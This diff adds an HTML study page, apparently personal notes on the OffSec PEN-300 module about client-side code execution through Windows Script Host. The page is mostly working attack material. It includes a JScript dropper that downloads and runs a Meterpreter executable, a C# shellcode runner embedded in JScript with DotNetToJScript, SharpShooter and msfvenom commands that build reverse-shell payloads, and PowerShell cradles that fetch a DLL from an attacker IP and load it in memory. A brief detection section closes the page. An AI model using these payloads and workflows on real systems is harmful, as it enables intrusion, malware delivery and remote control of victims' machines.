@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="es" data-nz-theme="light" data-nz-marca="monocromo">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PEN-300 Module 06 — Client-Side Code Execution with Windows Script Host (JScript + DotNetToJScript) — distill</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/tokens.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/marcas/monocromo.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p1-layout.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p2-navigation.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p3-typography.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p4-actions.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p6-feedback.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p8-data.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p17-patrones.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+const mq = matchMedia('(prefers-color-scheme: dark)');
+const saved = localStorage.getItem('nz-theme');
+if (saved === 'dark' || saved === 'light') document.documentElement.dataset.nzTheme = saved;
+else if (mq.matches) document.documentElement.dataset.nzTheme = 'dark';
+mq.addEventListener('change', e => {
+  if (!localStorage.getItem('nz-theme')) document.documentElement.dataset.nzTheme = e.matches ? 'dark' : 'light';
+});
+function nzToggleTheme() {
+  const cur = document.documentElement.dataset.nzTheme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.nzTheme = cur;
+  localStorage.setItem('nz-theme', cur);
+  if (window.nzAfterTheme) nzAfterTheme();
+}
+mermaid.initialize({ startOnLoad: false });
+mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+window.nzAfterTheme = async () => {
+  document.querySelectorAll('.mermaid').forEach(el => {
+    const code = el.getAttribute('data-src') || el.textContent;
+    el.setAttribute('data-src', code);
+    el.removeAttribute('data-processed');
+    el.textContent = code;
+  });
+  mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+  await mermaid.run({ querySelector: '.mermaid' });
+};
+document.addEventListener('DOMContentLoaded', () => {
+  if (document.querySelector('.mermaid')) mermaid.run({ querySelector: '.mermaid' });
+});
+</script>
+<style>
+.nz-prose pre.mermaid { background: none; text-align: center; }
+</style>
+</head>
+<body class="nz">
+<div class="nz-navbar nz-navbar--compact nz-navbar--bordered">
+<span class="nz-navbar__brand"><i></i>Distill</span>
+<span class="nz-navbar__links">
+<a class="nz-navbar__link" href="index.html">Índice</a>
+<a class="nz-navbar__link" href="cat/osep.html">OSEP (PEN-300)</a>
+<button class="nz-btn nz-btn--ghost nz-btn--sm" onclick="nzToggleTheme()" aria-label="Cambiar tema">◐</button>
+</span>
+</div>
+<main class="nz-container" style="padding-block: var(--nz-space-4)">
+<article class="nz-article">
+<header style="margin-bottom:var(--nz-space-4)">
+<p class="nz-eyebrow">Distill · OSEP (PEN-300)</p>
+<h1 class="nz-h2">PEN-300 Module 06 — Client-Side Code Execution with Windows Script Host (JScript + DotNetToJScript)</h1>
+<p class="nz-lbl nz-lbl--neutral">Fuente: material del curso correspondiente (sin video público)</p>
+</header>
+<div class="nz-prose">
+<blockquote>
+<p>Distilled from OffSec PEN-300 (OSEP) course material (module: Client Side Code Execution With Windows Script Host) — internal training reference, not for redistribution.</p>
+</blockquote>
+<h2>Objective</h2>
+<p>Gain client-side code execution via <strong>JScript</strong> files (<code>wscript</code>), a vector popularized by TrickBot and Emotet. Progression: simple dropper → Meterpreter dropper → fully <strong>in-memory shellcode runner</strong> by embedding a pre-compiled C# assembly in JScript with <strong>DotNetToJScript</strong>, then replicating it with <strong>SharpShooter</strong> and finishing with an in-memory PowerShell + C# reflective load. The motivation vs. the previous module: PowerShell is heavily scrutinized by defenders, so C# (compiled before delivery, executed in memory) lowers the profile while keeping full .NET access.</p>
+<h2>Target surface</h2>
+<ul>
+<li>Kali attacker: <code>192.168.119.120</code> (web root <code>/var/www/html</code>, Samba share at <code>\\192.168.119.120\visualstudio</code>).</li>
+<li>Windows 10 victim (user <code>Offsec</code> in <code>C:\Users\Offsec</code>) and separate Windows 10 <strong>development</strong> machine (Visual Studio, Squid proxy, <code>C:\Tools\DotNetToJscript-master.zip</code> pre-staged).</li>
+</ul>
+<h2>Techniques</h2>
+<h3>1. Why <code>.js</code> beats <code>.ps1</code></h3>
+<p>Windows launches files by extension → default app. Under <strong>Settings &gt; Apps &gt; Default apps &gt; Choose default apps by file type</strong>:</p>
+<ul>
+<li><code>.ps1</code> → <strong>Notepad</strong> (double-click opens an editor; never executes).</li>
+<li><code>.js</code> → <strong>Windows-Based Script Host</strong> (double-click executes).</li>
+</ul>
+<p>JScript = Microsoft's JavaScript dialect (ECMAScript-based). Outside a browser it escapes all sandbox restrictions and can touch <strong>ActiveX</strong> / WSH directly — no exploit needed.</p>
+<p>Basic ActiveX execution:</p>
+<pre><code class="language-js">var shell = new ActiveXObject(&quot;WScript.Shell&quot;)
+var res = shell.Run(&quot;cmd.exe&quot;);
+</code></pre>
+<p>WSH exits as soon as the script finishes (invisible in Process Explorer).</p>
+<h3>2. JScript Meterpreter dropper (download &amp; run on disk)</h3>
+<p>Chain of ActiveX objects, all undocumented-but-universal:</p>
+<div class="nz-table-wrap"><table class="nz-table">
+<thead>
+<tr>
+<th>Object</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>MSXML2.XMLHTTP</code></td>
+<td>synchronous HTTP GET (<code>Open('GET', url, false)</code>; <code>Send()</code>; check <code>.Status == 200</code>)</td>
+</tr>
+<tr>
+<td><code>ADODB.Stream</code></td>
+<td>binary sink: <code>Open()</code>, <code>Type = 1</code> (adTypeBinary), <code>Write(Object.ResponseBody)</code>, <code>Position = 0</code>, <code>SaveToFile("met.exe", 2)</code> (adSaveCreateOverWrite), <code>Close()</code></td>
+</tr>
+<tr>
+<td><code>WScript.Shell</code></td>
+<td><code>Run("met.exe")</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>Payload prep: 64-bit Meterpreter reverse HTTPS EXE via <code>msfvenom</code> into the Kali web root; matching <code>multi/handler</code> waiting. Complete script (Listing 8) is just these three objects in ~15 lines — double-click → 64-bit shell.</p>
+<blockquote>
+<p><strong>Exercise nugget:</strong> make the GET proxy-aware with the <code>setProxy</code> method (test against the Squid proxy on the Windows 10 dev machine).</p>
+</blockquote>
+<h3>3. Dev environment: Samba + Visual Studio</h3>
+<ul>
+<li>Kali: <code>apt install samba</code>; minimal <code>smb.conf</code> (<code>[visualstudio] path=/home/kali/data, browseable=yes, read only=no</code>); <code>smbpasswd -a kali</code>; start <code>smbd</code> + <code>nmbd</code>; <code>chmod -R 777 /home/kali/data</code>.</li>
+<li>Reason: VS projects vanish on VM revert; the SMB share persists code.</li>
+<li>Workflow: open share in Explorer (<code>\\192.168.119.120</code>), store creds, create <strong>Console App (.NET Framework)</strong> C# project on the share. <strong>Solution</strong> = parent unit, may hold multiple <strong>projects</strong>.</li>
+<li>Compile in <strong>Release</strong> mode (Debug symbols can trip security scanners) → binary lands at <code>\\...\ConsoleApp1\bin\Release\ConsoleApp1.exe</code>.</li>
+<li>Remote-location projects trigger a VS security warning (malicious <code>.csproj</code>/config files = client-side vector) — accept it.</li>
+</ul>
+<h3>4. DotNetToJScript (James Forshaw, 2017)</h3>
+<p>Executes a C# assembly from JScript. Repo available locally at <code>C:\Tools\DotNetToJscript-master.zip</code>; copy to the Samba share and open in VS.</p>
+<ul>
+<li><strong>ExampleAssembly</strong> project → <code>TestClass.cs</code> (must be <code>[ComVisible(true)]</code>):</li>
+</ul>
+<pre><code class="language-csharp">[ComVisible(true)]
+public class TestClass
+{
+    public TestClass() { MessageBox.Show(&quot;Test&quot;, ...); }   // entry point
+    public void RunProcess(string path) { Process.Start(path); }
+}
+</code></pre>
+<ul>
+<li>Compile the solution (Release), then copy <code>DotNetToJscript.exe</code>, <code>NDesk.Options.dll</code>, and <code>ExampleAssembly.dll</code> into one folder (<strong>required at every conversion</strong>).</li>
+<li>Convert:</li>
+</ul>
+<pre><code>C:\Tools&gt; DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
+</code></pre>
+<p>(v4 because modern Win10 ships only .NET Framework 4 by default.)</p>
+<p><strong>How the generated JS works</strong> — worth memorizing, it's the core of the technique:</p>
+<ol>
+<li><code>setversion()</code> — pins the CLR via <code>COMPLUS_Version</code> env var = <code>v4.0.30319</code>.</li>
+<li><code>debug(s)</code> — empty unless <code>-d</code> was passed.</li>
+<li><code>base64ToStream(b)</code> — Base64 → <code>System.IO.MemoryStream</code> using <code>System.Text.ASCIIEncoding</code> + <code>System.Security.Cryptography.FromBase64Transform</code> through ActiveXObject instantiations of .NET classes.</li>
+<li>Main: <code>serialized_obj</code> = Base64 <strong>serialized binary blob</strong> (the assembly, binary-formatted), <code>entry_class = 'TestClass'</code>; then:</li>
+</ol>
+<pre><code class="language-js">var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
+var d = fmt.Deserialize_2(stm);                       // assembly in memory
+var al = new ActiveXObject('System.Collections.ArrayList');
+al.Add(undefined);                                    // empty-arg trick
+var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);  // run constructor
+</code></pre>
+<p><code>DynamicInvoke</code> needs an argument array; since the constructor takes none, an ArrayList with one <code>undefined</code> element is emptied out via <code>ToArray()</code>.</p>
+<blockquote>
+<p><strong>Exercise:</strong> change <code>TestClass</code> to launch <code>cmd.exe</code> instead of a MessageBox.</p>
+</blockquote>
+<h3>5. Win32 API calls from C</h3>
+<p>P/Invoke via <code>[DllImport]</code> (no PowerShell reflection complexity — we compile ahead of delivery). Reference C→C# signatures at <strong>www.pinvoke.net</strong>. Namespaces needed: <code>System</code>, <code>System.Diagnostics</code>, <code>System.Runtime.InteropServices</code>.</p>
+<pre><code class="language-csharp">[DllImport(&quot;user32.dll&quot;, CharSet = CharSet.Auto)]
+public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);
+// MessageBox(IntPtr.Zero, &quot;text&quot;, &quot;caption&quot;, 0);
+</code></pre>
+<h3>6. C# shellcode runner</h3>
+<p>Same triad as the VBA/PowerShell modules — <code>VirtualAlloc</code>, <code>CreateThread</code>, <code>WaitForSingleObject</code>:</p>
+<pre><code class="language-csharp">[DllImport(&quot;kernel32.dll&quot;, SetLastError = true, ExactSpelling = true)]
+static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport(&quot;kernel32.dll&quot;)]
+static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+[DllImport(&quot;kernel32.dll&quot;)]
+static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+static void Main(string[] args)
+{
+    byte[] buf = new byte[N] { 0xfc,0x48,... };            // 64-bit staged meterpreter, csharp format
+    int size = buf.Length;
+    IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);  // RWX commit/reserve
+    Marshal.Copy(buf, 0, addr, size);                       // no namespace prefix needed in C#
+    IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+    WaitForSingleObject(hThread, 0xFFFFFFFF);               // keep process alive
+}
+</code></pre>
+<p>Key details: 64-bit shellcode because <strong>JScript runs in a 64-bit context on x64 Windows by default</strong>; set the CPU platform to <strong>x64</strong> in VS Configuration Manager (New platform) before compiling; <code>WaitForSingleObject</code> prevents process exit before the shell lands.</p>
+<h3>7. JScript shellcode runner (the deliverable)</h3>
+<ol>
+<li>Move the three <code>DllImport</code>s into <code>TestClass</code> (declarations go in the class, outside the method) and put the runner code inside the <code>TestClass()</code> constructor.</li>
+<li>Compile <strong>ExampleAssembly</strong> for x64.</li>
+<li><code>DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js</code></li>
+<li>Double-click <code>runner.js</code> with multi/handler up → staged reverse Meterpreter shell, entirely from the embedded assembly.</li>
+</ol>
+<blockquote>
+<p><strong>Exercises:</strong> repeat in <strong>VBScript</strong> format (<code>--lang</code> swap). <strong>Extra mile:</strong> phishing email → Apache page performing <strong>HTML smuggling</strong> of the JScript runner for Chrome users.</p>
+</blockquote>
+<h3>8. SharpShooter (automation)</h3>
+<p>Install: clone <code>mdsecactivebreach/SharpShooter</code> to <code>/opt</code>, <code>pip install -r requirements.txt</code> (<code>apt install python-pip</code> if missing). It automates the DotNetToJScript-style weaponization.</p>
+<pre><code class="language-bash">sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f raw -o /var/www/html/shell.txt
+
+sudo python SharpShooter.py --payload js --dotnetver 4 --stageless \
+  --rawscfile /var/www/html/shell.txt --output test
+# [*] Written delivery payload to output/test.js
+</code></pre>
+<ul>
+<li><code>--stageless</code> (SharpShooter sense): whole JScript payload delivered at once; a <strong>staged</strong> variant instead delivers via HTML smuggling.</li>
+<li>Copy <code>test.js</code> to the victim, double-click, catch the shell. Course's closing caution: tools save time, but understand the underlying code — especially for AV bypass work.</li>
+</ul>
+<h3>9. In-memory PowerShell revisited (reflective assembly load)</h3>
+<p>Separate compile from load: build a <strong>Class Library (.NET Framework)</strong> project (<code>ClassLibrary1.dll</code>) in the same solution — copy the <code>DllImport</code>s and Main body into a <code>public static void runner()</code> (public+static so reflection can reach it).</p>
+<p>Download cradle, two variants:</p>
+<pre><code class="language-powershell"># Variant A — touches disk (DownloadFile + LoadFile)
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/ClassLibrary1.dll', 'C:\Users\Offsec\ClassLibrary1.dll')
+$assem = [System.Reflection.Assembly]::LoadFile(&quot;C:\Users\Offsec\ClassLibrary1.dll&quot;)
+
+# Variant B — fully in memory (DownloadData + Load(byte[]))
+$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll')
+$assem = [System.Reflection.Assembly]::Load($data)
+
+# Either way, invoke via reflection:
+$class  = $assem.GetType(&quot;ClassLibrary1.Class1&quot;)
+$method = $class.GetMethod(&quot;runner&quot;)
+$method.Invoke(0, $null)
+</code></pre>
+<p><code>Load(byte[])</code> is the diskless win over <code>LoadFile</code>. Use <strong>64-bit PowerShell ISE</strong>. Capstone exercise: combine with the Office module — call this technique from a Word macro, remembering Word is a <strong>32-bit</strong> process.</p>
+<h2>Extraction artifacts / notes</h2>
+<ul>
+<li>Shellcode sizes are inconsistent across listings: "626" (Listing 31/34), "630" (Listing 32), and msfvenom's "716 bytes" (Listing 37) — different payloads/generations; the elided <code>...</code> in byte arrays is extractor truncation, not original content.</li>
+<li>Several listing numbers (15, 16, 35, 42) wrap file paths/commands that the extractor broke across lines; the <code>\\192.168.119.120\...</code> UNC and <code>C:\Users\Offsec&gt;...</code> console lines belong to a single line each.</li>
+<li>"Nashhorn" is a typo for <strong>Nashorn</strong> (Java's built-in JS engine, mentioned in Wrapping Up alongside HTA/Demiguise, IronPython/Trinity, jRAT/Adwind).</li>
+<li>Listing 33 shows <code>...</code> in the middle of the TestClass — the shellcode constructor body from Listing 34 is the elided part; both listings together form one file.</li>
+</ul>
+<h2>Detection &amp; defense</h2>
+<ul>
+<li><strong>File associations</strong>: <code>.js</code>/<code>.jse</code>/<code>.vbs</code>/<code>.wsf</code> execute on double-click — remove associations or force WSH to deny execution (WSH isolation policy / attack surface reduction rules blocking JS/VBS launch from downloads).</li>
+<li><strong>ActiveX in WSH</strong>: <code>MSXML2.XMLHTTP</code>, <code>ADODB.Stream</code>, and .NET classes via <code>ActiveXObject</code> are the whole toolkit; EDR visibility on <code>wscript.exe</code> spawning <code>cmd</code>/network traffic is the control point.</li>
+<li><strong>BinaryFormatter deserialization</strong> (<code>Deserialize_2</code> + <code>DynamicInvoke</code>) is the DotNetToJScript signature — flag serialized-object blobs and <code>COMPLUS_Version</code> manipulation in scripts.</li>
+<li><strong>In-memory assembly loading</strong>: <code>[Reflection.Assembly]::Load(byte[])</code> with <code>DownloadData</code> cradles; monitor for <code>WebClient</code> download + reflection invoke chains.</li>
+<li><strong>Dev-share hygiene</strong>: open-from-SMB VS projects are themselves a phishing vector (course makes this point explicitly via the security warning).</li>
+</ul>
+</div>
+<footer class="nz-callout" style="margin-top:var(--nz-space-5)">
+<p class="nz-lbl">Atribución</p>
+<p>Artículo destilado en español a partir de material del curso correspondiente. El análisis y la redacción son propios; las ideas y los datos presentados corresponden a los autores originales.</p>
+</footer>
+</article>
+</main>
+</body>
+</html>
